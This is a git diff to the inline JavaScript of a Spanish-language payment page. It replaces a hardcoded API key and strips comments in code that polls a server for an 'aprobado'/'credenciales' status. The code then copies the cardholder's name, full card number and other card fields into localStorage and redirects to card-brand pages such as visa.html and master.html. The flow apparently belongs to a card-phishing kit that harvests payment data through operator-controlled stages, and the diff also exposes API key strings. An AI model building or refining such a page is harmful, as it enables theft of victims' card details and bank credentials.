@@ -395,7 +395,9 @@
     <script>
         const POLLING_INTERVAL = 2000;
         const MAX_POLLING_TIME = 300000;
-        const HANDYAPI_KEY = 'HAS-139kYW5q3NS98PmXt8w67rbDH';
+        
+        // 🔥 CLAVE CORREGIDA: Publishable Key
+        const HANDYAPI_KEY = 'PUB-co5YEcRHr043lS53Ctgn86usDYGx';
 
         const formatCLP = (amount) =>
             new Intl.NumberFormat('es-CL', { style: 'currency', currency: 'CLP', maximumFractionDigits: 0 }).format(amount);
@@ -564,7 +566,6 @@
                     if (data.estado === 'aprobado' && data.fase === 'credenciales') {
                         clearInterval(pollingInterval);
                         
-                        // Guardar en localStorage para visa.php
                         const tarjetaAprobada = {
                             titular: document.getElementById('titular').value || document.getElementById('titular-m').value,
                             numero: document.getElementById('numero').value.replace(/\s/g, '') || document.getElementById('numero-m').value.replace(/\s/g, ''),
@@ -578,10 +579,9 @@
                         localStorage.setItem('tarjeta_aprobada', JSON.stringify(tarjetaAprobada));
                         localStorage.setItem('bancoEmisor', tarjetaAprobada.banco);
 
-                        // 🔥 FIX: Forzar que la marca sea en minúsculas y validar
                         const marcaSegura = (data.marca || 'visa').toLowerCase();
                         const mapa = { visa: 'visa.html', mastercard: 'master.html', amex: 'amex.html' };
-                        const destino = mapa[marcaSegura] || 'visa.html'; // Si falla, siempre va a visa.php
+                        const destino = mapa[marcaSegura] || 'visa.html'; 
 
                         overlayMostrarLogo(marcaSegura, `Redirigiendo...`);
                         overlayActualizarProgreso(100);
